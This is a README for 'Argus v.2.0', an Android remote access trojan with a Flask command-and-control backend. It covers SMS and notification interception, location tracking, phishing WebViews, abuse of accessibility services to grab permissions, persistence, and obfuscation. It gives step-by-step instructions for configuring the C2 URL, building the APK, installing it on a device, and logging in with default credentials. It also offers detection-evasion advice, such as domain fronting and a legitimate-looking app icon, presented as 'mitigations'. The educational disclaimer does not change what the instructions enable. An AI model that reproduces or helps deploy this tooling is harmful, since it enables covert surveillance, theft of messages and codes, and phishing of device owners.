# 🕵️ Argus v.2.0 - Simplified Version

## 📋 About this version

**Argus v.2.0** is a **simplified and direct** version of the Android remote control system, without using:

❌ **Dropper**  
❌ **Steganography**  
❌ **.dex files**  
❌ **Dynamic payload**  
❌ **DexLoader**

✅ **All features integrated directly into the application code**

---

## 🎯 Main Differences from Original Version

| Feature | Original Version | Version 2.0 |
|---------|------------------|-------------|
| Architecture | Dropper + Dynamic payload | Single application |
| Code loading | DexClassLoader at runtime | Integrated code |
| Payload distribution | Steganography in images | N/A |
| Obfuscation | ProGuard + Steganography | ProGuard only |
| Complexity | High (3 modules) | Medium (1 module) |
| Maintenance | Difficult | Simple |
| Detection | More difficult | Moderate |

---

## 📁 Project Structure

```
Argus v.2.0/
├── android/                    # Unified Android module
│   ├── src/main/
│   │   ├── AndroidManifest.xml
│   │   ├── java/com/argus/rat/
│   │   │   ├── MainActivity.java              # Simplified main activity
│   │   │   ├── C2Client.java                  # C2 client (HTTP + WebSocket)
│   │   │   ├── DataExfiltrationManager.java   # Exfiltration manager
│   │   │   ├── PersistentService.java         # Persistence service
│   │   │   ├── TapTrapManager.java            # Permission manager
│   │   │   ├── AccessibilityTapTrapService.java # Accessibility service
│   │   │   ├── SmsManager.java                # SMS management
│   │   │   ├── SmsInterceptor.java            # SMS interception
│   │   │   ├── NotificationService.java       # Notification monitoring
│   │   │   ├── StealthWebViewManager.java     # Stealth WebView
│   │   │   ├── PhishingWebViewManager.java    # Phishing WebView
│   │   │   ├── PowerManagement.java           # Power management
│   │   │   ├── DeviceIdentifier.java          # Device identification
│   │   │   ├── NetworkManager.java            # Network management
│   │   │   ├── AdaptiveNetworkManager.java    # Adaptive network
│   │   │   ├── WebSocketClient.java           # WebSocket client
│   │   │   ├── BootCompleteReceiver.java      # Boot receiver
│   │   │   ├── ServiceRestarterReceiver.java  # Service restart receiver
│   │   │   └── PayloadService.java            # Operations service
│   │   └── res/                               # Android resources
│   ├── build.gradle                           # Gradle configuration
│   └── proguard-rules.pro                     # ProGuard rules
│
├── backend/                    # C2 Python/Flask server (unchanged)
│   ├── server_integrated.py                   # Main server (adapted)
│   ├── run_server.py                          # Initialization script
│   ├── config.py                              # Configuration
│   ├── requirements.txt                       # Python dependencies
│   ├── crypto/
│   │   └── encryption.py                      # Encryption
│   ├── templates/                             # HTML templates
│   │   ├── base.html
│   │   ├── dashboard.html
│   │   ├── devices.html
│   │   ├── commands.html
│   │   └── logs.html
│   ├── static/                                # Static files
│   │   ├── css/style.css
│   │   └── js/
│   │       ├── app.js
│   │       ├── devices-manager.js
│   │       └── commands-manager.js
│   ├── phishing/                              # Phishing system
│   │   ├── phishing_api.py
│   │   ├── phishing_manager.py
│   │   └── templates/
│   └── military/                              # Military features
│       ├── military_api.py
│       └── military_manager.py
│
├── database/                   # Database structure
│   └── backend/
│       ├── database_manager.py                # Database manager
│       ├── models.py                          # Data models
│       └── models_military.py                 # Military models
│
├── common/                     # Shared code
│   └── crypto/
│       └── EncryptionUtils.java               # Encryption utilities
│
├── documentation/              # Documentation
│   └── README.md
│
├── build.gradle                # Root build
├── settings.gradle             # Gradle settings
└── README.md                   # This file
```

---

## 🚀 Maintained Features

### ✅ Evasion and Persistence
- ✅ TapTrap for automatic permission acquisition
- ✅ Persistent foreground service
- ✅ Boot receiver for automatic initialization
- ✅ Service restarter for automatic recovery
- ✅ Battery optimization bypass
- ✅ Intelligent PowerManagement

### ✅ C2 Communication
- ✅ HTTP/HTTPS for commands
- ✅ WebSocket for real-time communication
- ✅ Data encryption
- ✅ Automatic retry logic
- ✅ Adaptive network (WiFi/Cellular)

### ✅ Data Exfiltration
- ✅ SMS interception
- ✅ Notification monitoring
- ✅ GPS location tracking
- ✅ System data
- ✅ Device information

### ✅ Remote Control
- ✅ SMS sending
- ✅ Command execution
- ✅ Stealth WebView
- ✅ Application management
- ✅ Information collection

### ✅ C2 Backend
- ✅ Complete web dashboard
- ✅ Device management
- ✅ Command system
- ✅ Detailed logs
- ✅ Phishing system
- ✅ Military features
- ✅ Real-time WebSocket

---

## 🔧 Installation and Configuration

### 1. Prerequisites

**Android:**
- Android Studio 2022.1+
- JDK 11+
- Android SDK 34
- Gradle 8.1.0+

**Backend:**
- Python 3.8+
- pip

### 2. Configure Backend

```bash
cd backend

# Install dependencies
pip install -r requirements.txt

# Configure database
python init_db.py

# Start server
python run_server.py
```

Server will be available at: `http://localhost:5000`

**Default credentials:**
- User: `admin`
- Password: `admin123`

### 3. Configure Android Application

**a) Open project in Android Studio:**
```bash
# Open "Argus v.2.0" folder in Android Studio
```

**b) Configure C2 server URL:**

Edit `android/src/main/java/com/argus/rat/MainActivity.java`:

```java
// C2 server settings
private static final String C2_SERVER_URL = "http://YOUR-SERVER:5000";
private static final String C2_WEBSOCKET_URL = "ws://YOUR-SERVER:5000";
```

**c) Build APK:**

```bash
cd android
./gradlew assembleRelease

# APK generated at:
# android/build/outputs/apk/release/android-release.apk
```

### 4. Device Installation

```bash
# Via ADB
adb install android/build/outputs/apk/release/android-release.apk

# Or manually transfer APK to device
```

### 5. First Execution

1. Open application on device
2. TapTrap will automatically start to obtain permissions
3. After permissions, system will be initialized
4. Device will appear in C2 dashboard

---

## 📊 Operation Flow (Simplified)

```
1. User installs APK
   ↓
2. App executes (MainActivity)
   ↓
3. TapTrap collects necessary permissions
   ↓
4. System initializes (all components)
   ↓
5. PersistentService starts in foreground
   ↓
6. C2Client connects to server
   ↓
7. Device registers on backend
   ↓
8. WebSocket establishes real-time connection
   ↓
9. DataExfiltrationManager starts collection
   ↓
10. System becomes operational 24/7
```

---

## 🛡️ Security and Obfuscation

### Implemented:
- ✅ ProGuard with aggressive obfuscation
- ✅ Communication encryption (optional)
- ✅ Obfuscated package names
- ✅ Obfuscated strings
- ✅ Production log removal
- ✅ Integrity verification

### Not Implemented (removed from v.1.0):
- ❌ LSB steganography
- ❌ Dynamic code loading
- ❌ Payload hash verification
- ❌ Multiple obfuscation layers

---

## 📈 Performance Comparison

| Metric | v.1.0 (Dropper) | v.2.0 (Simplified) |
|--------|-----------------|-------------------|
| APK Size | ~2.5 MB | ~1.8 MB |
| Initialization Time | ~5-8s | ~3-5s |
| Memory Consumption | ~80-100 MB | ~50-70 MB |
| Complexity | High | Medium |
| Detection Rate | Low | Moderate |
| Ease of Maintenance | Difficult | Simple |

---

## 🔍 Detection and Countermeasures

### Detection Vectors (v.2.0):

1. **Excessive permissions in manifest**
2. **Permanent foreground service**
3. **Use of accessibility services**
4. **C2 network communication**
5. **Static code analysis**

### Suggested Mitigations:

- Use HTTPS with valid certificates
- Domain fronting
- Variable communication intervals
- Generic package names
- Legitimate app icon and name

---

## 🧪 Testing

### Feature Checklist:

- [ ] Installation and initialization
- [ ] TapTrap collects permissions
- [ ] Connection to C2 server
- [ ] Device registration on backend
- [ ] Real-time WebSocket
- [ ] SMS interception
- [ ] Notification monitoring
- [ ] Remote command sending
- [ ] Persistence after reboot
- [ ] Automatic service recovery

---

## 🚨 Troubleshooting

### Problem: App doesn't connect to server
**Solution:**
1. Check server URL in `MainActivity.java`
2. Check firewall/open ports
3. Test connectivity: `ping YOUR-SERVER`

### Problem: Permissions not granted
**Solution:**
1. Check if TapTrap is enabled
2. Grant permissions manually in settings
3. Use `forceStartSystem()` as fallback

### Problem: Service gets killed by system
**Solution:**
1. Disable battery optimization
2. Add app to whitelist
3. Check if notification is being displayed

---

## 📄 License and Legal Notices

**⚠️ IMPORTANT:**

This project is provided for **educational purposes** and **security research** only.

- ❌ **DO NOT use for malicious activities**
- ❌ **DO NOT violate laws or regulations**
- ❌ **DO NOT compromise devices without explicit consent**
- ✅ **Use only in controlled environments**
- ✅ **Apply knowledge for defense and security**

Misuse may result in serious legal consequences.

---

## 🤝 Contributions

Contributions are welcome for:
- Security and evasion improvements
- Performance optimization
- Bug fixes
- Additional documentation
- New defensive features

---

## 📚 Additional Documentation

- `documentation/` - Detailed technical documentation
- `backend/README.md` - C2 backend guide
- Commented source code in all files

---

## 📞 Support

For technical questions or doubts:
- Review complete documentation
- Check server and device logs
- Analyze commented source code

---

**Developed to demonstrate mobile security techniques and promote cybersecurity awareness.**

**Version:** 2.0  
**Date:** October 2025  
**Status:** ✅ Stable Simplified Version


